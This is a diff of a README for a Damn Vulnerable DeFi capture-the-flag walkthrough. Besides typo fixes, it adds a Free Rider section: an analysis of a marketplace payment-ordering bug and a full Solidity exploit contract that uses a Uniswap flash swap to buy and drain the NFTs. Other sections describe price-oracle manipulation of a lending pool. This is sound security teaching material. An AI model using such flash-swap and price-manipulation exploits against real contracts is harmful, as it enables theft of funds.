@@ -6,7 +6,7 @@ Starting with 10 DVT tokens in balance, show that it’s possible to halt the va
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Flashloan check must fail_
 
@@ -32,7 +32,7 @@ Run `forge test --mp test/unstoppable/Unstoppable.t.sol --isolate` to validate t
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Player must have executed two or less transactions_
 2. _The flashloan receiver contract has been emptied_
@@ -84,7 +84,7 @@ Run `forge test --mp test/naive-receiver/NaiveReceiver.t.sol --isolate` to valid
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Player must have executed a single transaction_
 2. _All rescued funds sent to recovery account_
@@ -122,7 +122,7 @@ Run `forge test --mp test/truster/Truster.t.sol --isolate` to validate test
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _All rescued funds sent to recovery account_
 
@@ -170,7 +170,7 @@ Run `forge test --mp test/side-entrance/SideEntrance.t.sol --isolate` to validat
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Player saved as much funds as possible, perhaps leaving some dust_
 2. _All funds sent to the designated recovery account_
@@ -239,7 +239,7 @@ Run `forge test --mp test/the-rewarder/TheRewarder.t.sol --isolate` to validate 
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Player has taken all tokens from the pool_
 
@@ -303,7 +303,7 @@ Run `forge test --mp test/selfie/Selfie.t.sol --isolate` to validate test
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Exchange doesn't have ETH anymore_
 2. _ETH was deposited into the recovery account_
@@ -389,7 +389,7 @@ Run `forge test --mp test/compromised/Compromised.t.sol --isolate` to validate t
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _Player executed a single transaction_ `UNACHIEVABLE?`
 2. _All tokens of the lending pool were deposited into the recovery account_
@@ -441,13 +441,13 @@ Run `forge test --mp test/puppet/Puppet.t.sol --isolate` to validate test
 
 **Objective**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _All tokens of the lending pool were deposited into the recovery account_
 
 **Attack Analysis**
 
-- The implementation is still vulnerable becuase the lending pool gets the price from a Uniswap pari and it can still be manipulated by an attacker. Plus, balances are low, which facilitates the manipulation.
+- The implementation is still vulnerable because the lending pool gets the price from a Uniswap pair and it can still be manipulated by an attacker. Plus, balances are low, which facilitates the manipulation.
 - An attacker could swap DVT tokens in the Uniswap Pool and influence the prices of the Lending Pool. This being particular easy in this case because of the low amount of assets in the pool.
 - Then, the attacker could borrow assets in the lending pool at an unexpected price and drain its liquidity.
 
@@ -482,11 +482,93 @@ Run `forge test --mp test/puppet-v2/PuppetV2.t.sol --isolate` to validate test
 
 ---
 
+## 10.FREE RIDER
+
+**Objective**
+
+_from `_isSolved()` in test_
+
+1. _The recovery owner extracts all NFTs from its associated contract_
+2. _Exchange must have lost NFTs and ETH_
+3. _Player must have earned all ETH_
+
+**Attack Analysis**
+
+- The bug is located in the function `FreeRiderNFTMarketplace._buyOne()`. The payment is sent after transfering the token and thus, the buyer is received the payment instead of the seller.
+- An attacker can exploy this vulnerability by just buying the NFTs.
+- Since the player doesn't have enough funds to execute the recovery, i.e. buy the NFTs, they have to do a Flash Swap against the `uniswapPair`. To do so, a contract needs to be implemented to receive the funds from the swap.
+
+**POC**
+
+See [test/free-rider/FreeRider.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/free-rider/FreeRider.t.sol)
+
+```solidity
+function test_freeRider() public checkSolvedByPlayer {
+    Recover recover = new Recover(marketplace, recoveryManager, uniswapPair, weth);
+    bytes memory data = abi.encode(address(player));
+
+    uniswapPair.swap((NFT_PRICE * 6), 0, address(recover), data);
+}
+
+contract Recover {
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    IUniswapV2Pair uniswapPair;
+    WETH weth;
+
+    constructor(
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        IUniswapV2Pair _uniswapPair,
+        WETH _weth
+    ) {
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        uniswapPair = _uniswapPair;
+        weth = _weth;
+    }
+
+    receive() external payable {}
+
+    function uniswapV2Call(address, uint amount0, uint, bytes calldata data) external {
+        weth.withdraw(amount0);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < tokenIds.length; ++i) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+
+        for (uint256 i = 0; i < tokenIds.length; ++i) {
+            marketplace.token().safeTransferFrom(address(this), address(recoveryManager), i, data);
+        }
+
+        uint amount0Repay = (amount0 * 1004) / 1000;
+        weth.deposit{value: amount0Repay}();
+        weth.transfer(address(uniswapPair), amount0Repay);
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+        // Because of vulnerability in FreeRiderNFTMarketplace:L108, I cannot transfer the NFT to FreeRiderRecoveryManager in this call.
+        // FreeRiderRecoveryManager has no fallback function and cannot receive the ETH.
+
+        // marketplace.token().safeTransferFrom(address(this), address(recoveryManager), _tokenId, data);
+        return this.onERC721Received.selector;
+    }
+}
+
+```
+
+Run `forge test --mp test/free-rider/FreeRider.t.sol --isolate` to validate test
+
+---
+
 ## 14.PUPPET V3
 
 **Obejctive**
 
-_from `_isSolved()`in test_
+_from `_isSolved()` in test_
 
 1. _The attacker's exploit has to be completed in less than 115 seconds_
 2. _All tokens of the lending pool were drained_
